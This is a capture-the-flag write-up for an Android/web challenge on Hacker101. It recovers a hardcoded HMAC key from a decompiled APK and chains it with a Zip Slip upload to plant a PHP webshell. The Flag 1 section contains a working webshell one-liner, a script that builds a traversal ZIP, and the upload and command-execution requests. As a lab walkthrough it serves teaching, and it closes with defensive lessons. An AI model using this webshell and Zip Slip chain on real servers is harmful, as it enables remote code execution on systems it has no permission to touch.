# Mobile Webdev — Writeup (2/2)

**Difficulty:** Easy  
**Category:** Android (APK Reverse Engineering, HMAC bypass, Zip Slip)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** An Android app for web project management with file upload. The app authenticates requests with HMAC-MD5 and provides an upload endpoint on the server. The name "Mobile Webdev" combines Android reverse engineering with web server exploitation.

**What you face:** An APK with a hardcoded HMAC key to authenticate uploads, and a server that decompresses ZIP files without sanitizing paths, allowing path traversal to overwrite PHP files and achieve RCE.

**Vulnerabilities exploited:**
- Hardcoded HMAC Key (CWE-798) — MD5 key hardcoded in the APK, extractable by decompilation
- Zip Slip (CWE-22) — upload endpoint decompresses ZIP without validating `../` in filenames
- RCE via File Upload — Zip Slip allows overwriting executable PHP files on the server

**What you learn:**
- HMAC with a hardcoded client key is illusory authentication — anyone with the APK can sign
- Zip Slip: files inside a ZIP can have relative paths that escape the target directory
- Chaining: reverse engineering (flag 0) + server exploitation (flag 1)
- How to correctly validate ZIP uploads: verify the canonicalized path stays within the destination directory

## Objective

Reverse engineer the APK to discover the HMAC-MD5 key, bypass authentication, and exploit zip slip on the upload endpoint to execute PHP on the server.

---

## App Structure

- Package: `com.hacker101.webdev`
- Upload endpoint: `upload.php`
- Authentication: HMAC-MD5 computed with a hardcoded key from the APK

---

## Flag 0 — HMAC bypass with APK key

**Vulnerability:** HMAC key hardcoded in the APK, recoverable via reverse engineering.

### Step 1: Decompile the APK

```bash
jadx webdev.apk -d webdev_src/
# or
d2j-dex2jar webdev.apk -o webdev.jar && jd-gui webdev.jar
```

### Step 2: Locate the HMAC key

Search for "HMAC", "key", "secret" or "MD5" in the decompiled code. The secret key is hardcoded in `MainActivity.java` or in a constants file.

### Step 3: Calculate the correct HMAC-MD5

With the found key, calculate the HMAC-MD5 of the desired payload:

```python
import hmac, hashlib
key = b"<APK_KEY>"
message = b"<payload>"
h = hmac.new(key, message, hashlib.md5).hexdigest()
```

### Step 4: Send authenticated request

Include the calculated HMAC in the expected header/parameter. The response contains Flag 0.

---

## Flag 1 — Zip Slip on upload.php

**Vulnerability:** The `upload.php` endpoint extracts ZIP files without sanitizing paths, allowing writing files to arbitrary server directories.

### Step 1: Create malicious ZIP file

Create a ZIP containing a PHP file with path traversal:

```bash
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Create ZIP with path traversal
zip exploit.zip ../shell.php
# or using Python to force the path in the ZIP:
```

```python
import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.write('shell.php', '../shell.php')
```

### Step 2: Upload with HMAC authentication

Send the ZIP via `upload.php` with the correct HMAC:

```bash
curl -X POST https://<INSTANCE>/upload.php \
  -H "X-HMAC: <calculated_hmac>" \
  -F "file=@exploit.zip"
```

### Step 3: Access the webshell

The file was extracted to the root directory (path traversal). Access it:

```
GET https://<INSTANCE>/shell.php?cmd=cat+flag.txt
```

Flag 1 appears in the response.

---

## Attack Summary

```
FLAG 0: jadx webdev.apk → HMAC key → authenticated request → flag
FLAG 1: ZIP with ../shell.php → upload.php (zip slip) → webshell → flag
```

---

## Lessons Learned

1. **Hardcoded HMAC keys** in APKs are trivially extractable
2. **Zip Slip**: extracting ZIPs without validating paths allows overwriting arbitrary files
3. **ZIP uploads** must sanitize all internal paths before extraction
4. **HMAC as authentication in mobile apps** fails when the key can be extracted from the binary
5. Use session-based authentication with a dynamic token instead of a static key
